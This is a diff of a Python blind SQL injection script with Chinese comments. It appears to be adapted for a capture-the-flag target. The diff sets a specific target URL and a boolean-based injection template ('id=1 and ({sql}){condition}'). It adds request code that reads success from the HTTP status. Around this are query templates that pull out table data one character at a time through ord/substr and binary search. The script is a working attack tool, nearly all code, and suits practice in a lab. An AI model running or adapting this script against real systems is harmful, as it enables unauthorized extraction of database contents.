@@ -3,12 +3,12 @@
 import requests
 from argparse import ArgumentParser
 #url,必须修改
-url= ''
+url= 'http://35.227.24.107/0d1e3bde79/fetch?'
 ss = requests.session()
 
 #核心判断字段语句,必须修改。真则正确，假则错误
 ##eg.raw_payload="{id}=' or ({sql}){condition} and '1'='1"
-raw_payload="{id}=' or ({sql}){condition} and '1'='1"
+raw_payload="id=1 and ({sql}){condition} "
 #判断长度,一般不会改变
 ##eg.
 length_sql = "select length(group_concat({field})) from {table} where {where}"
@@ -19,11 +19,18 @@ field__sql = "select ord(substr(group_concat({field}),{index},1)) from {table} w
 
 
 #核心函数，必须修改，判断正确与否
-def post(sql,condition,isPrint=True):
+def post(sql,condition,isPrint=False):
     payload = raw_payload.format(sql=sql,condition=condition)
     if isPrint:
         print("payload:%s"%payload)
-    return False
+    try:
+        code = ss.get(url+payload).status_code
+        if code >= 300:
+            return False
+        else:
+            return True
+    except Exception:
+        pass
 
 def binary_search_length(field, table, where):
     print('查询表: %s 中字段: %s 值的总长度' % (table, field))
